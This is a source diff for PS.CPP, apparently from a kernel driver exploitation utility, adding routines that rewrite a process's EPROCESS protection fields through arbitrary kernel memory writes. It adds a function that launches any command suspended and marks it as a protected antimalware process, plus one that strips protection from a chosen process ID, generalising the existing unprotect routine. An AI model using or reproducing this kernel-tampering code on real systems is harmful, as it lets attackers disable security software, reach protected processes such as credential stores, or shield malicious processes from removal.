@@ -4,9 +4,9 @@
 *
 *  TITLE:       PS.CPP
 *
-*  VERSION:     1.27
+*  VERSION:     1.28
 *
-*  DATE:        25 Oct 2022
+*  DATE:        01 Dec 2022
 *
 *  Processes DKOM related routines.
 *
@@ -91,12 +91,93 @@ LPSTR KDUGetProtectionSignerAsString(
 *
 * Purpose:
 *
+* Start a Process as PPL-Antimalware
+*
+*/
+BOOL KDURunCommandPPL(
+    _In_ PKDU_CONTEXT Context,
+    _In_ LPWSTR CommandLine)
+{
+    BOOL       bResult = FALSE;
+    DWORD      dwThreadResumeCount = 0;
+
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);
+
+    bResult = CreateProcess(
+        NULL,               // No module name (use command line)
+        CommandLine,        // Command line
+        NULL,               // Process handle not inheritable
+        NULL,               // Thread handle not inheritable
+        FALSE,              // Set handle inheritance to FALSE
+        CREATE_SUSPENDED,   // Create Process suspended so we can edit
+        // its protection level prior to starting
+        NULL,               // Use parent's environment block
+        NULL,               // Use parent's starting directory 
+        &si,                // Pointer to STARTUPINFO structure
+        &pi);               // Pointer to PROCESS_INFORMATION structure
+    if (!bResult) {
+        printf("[!] Failed to create process: 0x%x\n", GetLastError());
+        return bResult;
+    }
+    printf_s("[+] Created Process with PID %d\r\n", pi.dwProcessId);
+
+    bResult = KDUControlProcess(Context, pi.dwProcessId, PsProtectedSignerAntimalware, PsProtectedTypeProtectedLight);
+    if (!bResult) {
+        printf_s("[!] Failed to set process as PPL: 0x%x\n", GetLastError());
+        return bResult;
+    }
+
+    dwThreadResumeCount = ResumeThread(pi.hThread);
+    if (dwThreadResumeCount != 1) {
+        printf_s("[!] Failed to resume process: %d | 0x%x\n", dwThreadResumeCount, GetLastError());
+        return bResult;
+    }
+
+    // Wait until child process exits.
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Close process and thread handles.
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return bResult;
+}
+
+/*
+* KDUControlProcess
+*
+* Purpose:
+*
+* Modify process object to remove PsProtectedProcess access restrictions.
+*
+*/
+BOOL KDUUnprotectProcess(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG_PTR ProcessId)
+{
+    return KDUControlProcess(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
+}
+
+/*
+* KDUControlProcess
+*
+* Purpose:
+*
 * Modify process object to remove PsProtectedProcess access restrictions.
 *
 */
 BOOL KDUControlProcess(
     _In_ PKDU_CONTEXT Context,
-    _In_ ULONG_PTR ProcessId)
+    _In_ ULONG_PTR ProcessId,
+    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
+    _In_ PS_PROTECTED_TYPE PsProtectionType)
 {
     BOOL       bResult = FALSE;
     ULONG      Buffer;
@@ -176,12 +257,12 @@ BOOL KDUControlProcess(
 
                 printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);
 
-                Buffer = 0;               
+                Buffer = 0;
 
-                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle, 
-                    VirtualAddress, 
-                    &Buffer, 
-                    sizeof(ULONG))) 
+                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                    VirtualAddress,
+                    &Buffer,
+                    sizeof(ULONG)))
                 {
                     PsProtection = (PS_PROTECTION*)&Buffer;
 
@@ -194,20 +275,20 @@ BOOL KDUControlProcess(
                         PsProtection->Type,
                         pStr);
 
-                    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
-
                     pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
                     printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
                         PsProtection->Signer,
                         pStr);
 
-                    PsProtection->Signer = PsProtectedSignerNone;
-                    PsProtection->Type = PsProtectedTypeNone;
+                    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
+
+                    PsProtection->Signer = PsProtectionSigner;
+                    PsProtection->Type = PsProtectionType;
                     PsProtection->Audit = 0;
 
-                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle, 
-                        VirtualAddress, 
-                        &Buffer, 
+                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                        VirtualAddress,
+                        &Buffer,
                         sizeof(ULONG));
 
                     if (bResult) {
